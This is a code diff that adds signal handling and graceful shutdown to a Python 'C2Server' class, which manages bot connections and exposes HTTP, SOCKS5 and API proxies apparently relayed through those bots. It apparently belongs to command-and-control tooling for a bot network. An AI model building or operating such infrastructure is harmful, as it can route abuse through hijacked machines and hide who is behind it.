@@ -15,6 +15,7 @@ import logging
 import uuid
 import os
 import json
+import signal
 from typing import Dict, Tuple, Optional
 
 from protocol import Frame, FramedStream, Heartbeat
@@ -47,6 +48,9 @@ class C2Server:
         self.api_port = api_port
         self.bot_token = bot_token or "changeme"
         self.ssl_ctx: Optional[ssl.SSLContext] = None
+        self._shutdown_event = asyncio.Event()
+        self._servers = []
+        self._tasks = []
         if certfile and keyfile:
             try:
                 if os.path.exists(certfile) and os.path.exists(keyfile):
@@ -77,22 +81,80 @@ class C2Server:
         return self.bots.get(bot_id)
 
     async def serve(self):
+        # Setup signal handlers
+        self._setup_signal_handlers()
+        
         bot_server = await asyncio.start_server(self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx)
         http_server = await asyncio.start_server(self._handle_http_client, self.host, self.http_port)
         socks_server = await asyncio.start_server(self._handle_socks_client, self.host, self.socks_port)
         api_server = await asyncio.start_server(self._handle_api_client, self.host, self.api_port)
+        
+        self._servers = [bot_server, http_server, socks_server, api_server]
         addrs = ", ".join(str(s.getsockname()) for s in bot_server.sockets)
         logger.info("C2 listening for bots on %s", addrs)
         logger.info("HTTP proxy on %s:%d", self.host, self.http_port)
         logger.info("SOCKS5 proxy on %s:%d", self.host, self.socks_port)
         logger.info("Web API on %s:%d", self.host, self.api_port)
-        async with bot_server, http_server, socks_server, api_server:
-            await asyncio.gather(
-                bot_server.serve_forever(),
-                http_server.serve_forever(),
-                socks_server.serve_forever(),
-                api_server.serve_forever(),
-            )
+        
+        try:
+            # Start all servers
+            server_tasks = [
+                asyncio.create_task(server.serve_forever(), name=f"server-{i}")
+                for i, server in enumerate(self._servers)
+            ]
+            self._tasks.extend(server_tasks)
+            
+            # Wait for shutdown signal
+            await self._shutdown_event.wait()
+        except KeyboardInterrupt:
+            logger.info("Received keyboard interrupt")
+        finally:
+            await self._cleanup()
+
+    def _setup_signal_handlers(self):
+        """Setup signal handlers for graceful shutdown."""
+        def signal_handler(signum, frame):
+            logger.info("Received signal %d, initiating graceful shutdown...", signum)
+            self._shutdown_event.set()
+        
+        # Setup signal handlers
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        # On Windows, also handle SIGBREAK
+        if hasattr(signal, 'SIGBREAK'):
+            signal.signal(signal.SIGBREAK, signal_handler)
+
+    async def _cleanup(self):
+        """Cleanup resources during shutdown."""
+        logger.info("Starting C2 cleanup...")
+        
+        # Cancel all tasks
+        for task in self._tasks:
+            if not task.done():
+                task.cancel()
+                try:
+                    await task
+                except asyncio.CancelledError:
+                    pass
+
+        # Close all servers
+        for server in self._servers:
+            server.close()
+            await server.wait_closed()
+
+        # Close all bot connections
+        for bot_id, session in list(self.bots.items()):
+            logger.info("Closing bot connection: %s", bot_id)
+            try:
+                if session.heartbeat:
+                    await session.heartbeat.stop()
+                session.stream.close()
+            except Exception as e:
+                logger.warning("Error closing bot %s: %s", bot_id, e)
+
+        self.bots.clear()
+        logger.info("C2 cleanup completed")
 
     async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         peer = writer.get_extra_info("peername")
